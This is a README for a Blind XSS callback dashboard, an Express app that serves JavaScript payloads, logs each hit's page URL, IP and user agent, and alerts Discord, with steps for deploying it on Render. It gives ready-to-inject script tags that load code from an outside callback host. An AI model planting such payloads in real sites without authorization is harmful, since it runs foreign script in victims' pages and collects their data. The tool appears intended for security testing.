# Blind XSS HIT Dashboard

![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)
![Express](https://img.shields.io/badge/Express-4.x-000000?logo=express&logoColor=white)
![Render](https://img.shields.io/badge/Deploy-Render-46E3B7?logo=render&logoColor=000)
![License](https://img.shields.io/github/license/Ranveerrrrr/Blind-XSS-HIT-Dashboard)

A small Blind XSS callback dashboard that serves JavaScript payloads from `/x/<marker>`, logs hits, groups them by page URL, and can notify Discord when a new hit arrives.

## Features

- Password-protected dashboard at `/dashboard`
- Payload builder for `/x/<marker>` URLs
- Hit grouping by page URL/site
- Filters with suggestions for page URL, IP, and marker
- Per-page actions: copy URL, cut, paste into another page group, delete
- Clear all hits
- Download hit log as `callbacks.jsonl`
- Import JSON/JSONL hit logs and append them without replacing existing data
- Optional Discord webhook notifications
- Optional Render persistent disk support

## How It Works

Payload URLs use this format:

```html
<script src="https://xss.example.com/x/blind-xss"></script>
```

Everything after `/x/` becomes the marker. For example:

```text
https://xss.example.com/x/signup-name
```

logs marker:

```text
signup-name
```

The app records:

- marker
- page URL or referrer
- IP
- user agent
- language
- viewport
- source type: `payload-load`, `script`, `image`, or `import`
- timestamp

Random 404 paths do not become hits. Only `/x/<marker>`, `/callback`, and `/i/<marker>.gif` create log entries.

## Local Setup

```powershell
git clone https://github.com/Ranveerrrrr/Blind-XSS-HIT-Dashboard.git
cd Blind-XSS-HIT-Dashboard
npm install
```

Create local environment variables:

```powershell
$env:PUBLIC_BASE_URL = "http://localhost:10000"
$env:DASHBOARD_USERNAME = "admin"
$env:DASHBOARD_PASSWORD = "change-me"
$env:SESSION_SECRET = "replace-with-a-long-random-string"
npm start
```

Open:

```text
http://localhost:10000/dashboard
```

## Required Environment Variables

Set these on your host:

| Variable | Required | Example | Purpose |
| --- | --- | --- | --- |
| `PUBLIC_BASE_URL` | Yes | `https://xss.example.com` | Public URL used inside generated payloads |
| `DASHBOARD_USERNAME` | Yes | `admin` | Dashboard login username |
| `DASHBOARD_PASSWORD` | Yes | `change-me` | Dashboard login password |
| `SESSION_SECRET` | Recommended | long random string | Signs dashboard login cookies |
| `DISCORD_WEBHOOK_URL` | Optional | Discord webhook URL | Sends a notification for each new hit |
| `DATA_DIR` | Optional | `/var/data` | Directory where `callbacks.jsonl` is stored |

`SESSION_SECRET` falls back to `DASHBOARD_PASSWORD` if not set, but a separate long random value is better.

## Deploy On Render

1. Push this repo to GitHub.
2. Go to Render and create a new **Web Service**.
3. Select this repository.
4. Runtime: **Node**
5. Build command:

```text
npm install
```

6. Start command:

```text
npm start
```

7. Add environment variables:

```text
PUBLIC_BASE_URL=https://xss.example.com
DASHBOARD_USERNAME=your-username
DASHBOARD_PASSWORD=your-password
SESSION_SECRET=long-random-string
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
DATA_DIR=/var/data
```

8. Deploy the service.

## Connect A Custom Domain

Recommended layout:

```text
main website:      https://example.com
Blind XSS server:  https://xss.example.com
```

In Render:

1. Open your Web Service.
2. Go to **Settings -> Custom Domains**.
3. Add `xss.example.com`.
4. Render will show the DNS record you need.

In your DNS provider:

- Add the CNAME or A record Render gives you.
- Wait for DNS and TLS to become active.

Then set:

```text
PUBLIC_BASE_URL=https://xss.example.com
```

Redeploy after changing environment variables.

## Persistent Storage

By default, hits are written to:

```text
callbacks.jsonl
```

On platforms like Render, the filesystem can reset on redeploy unless you use a persistent disk.

For Render:

1. Add a persistent disk to the service.
2. Mount it at:

```text
/var/data
```

3. Set:

```text
DATA_DIR=/var/data
```

The app will store hits at:

```text
/var/data/callbacks.jsonl
```

## Discord Notifications

Create a Discord webhook:

1. Open Discord channel settings.
2. Go to **Integrations -> Webhooks**.
3. Create webhook.
4. Copy webhook URL.
5. Set it as:

```text
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
```

Each new hit sends an embed with marker, source, IP, page URL/referrer, and user agent.

## Usage

Open the dashboard:

```text
https://xss.example.com/dashboard
```

Login with your configured dashboard username/password.

Use a generated payload such as:

```html
<script src="https://xss.example.com/x/blind-xss"></script>
```

For different injection points, change the marker:

```html
<script src="https://xss.example.com/x/signup-name"></script>
<script src="https://xss.example.com/x/admin-note"></script>
<script src="https://xss.example.com/x/billing-address"></script>
```

When the payload is requested or executed, hits appear in the dashboard.

## Dashboard Management

- `Clear all` empties the backend log.
- `Download hits` downloads the full `callbacks.jsonl`.
- Selecting an import file previews it locally in your browser.
- `Add to logs` appends imported hits to the backend log.
- The 3-dot menu on page groups supports copy, cut, paste, and delete.

## Security Notes

- Do not commit real passwords, Discord webhook URLs, or callback logs.
- Keep `callbacks.jsonl` ignored.
- Use a strong `SESSION_SECRET`.
- Use HTTPS for your public payload domain.
- Rotate credentials if the repository becomes public and you accidentally committed secrets.

## License

See [LICENSE](LICENSE).
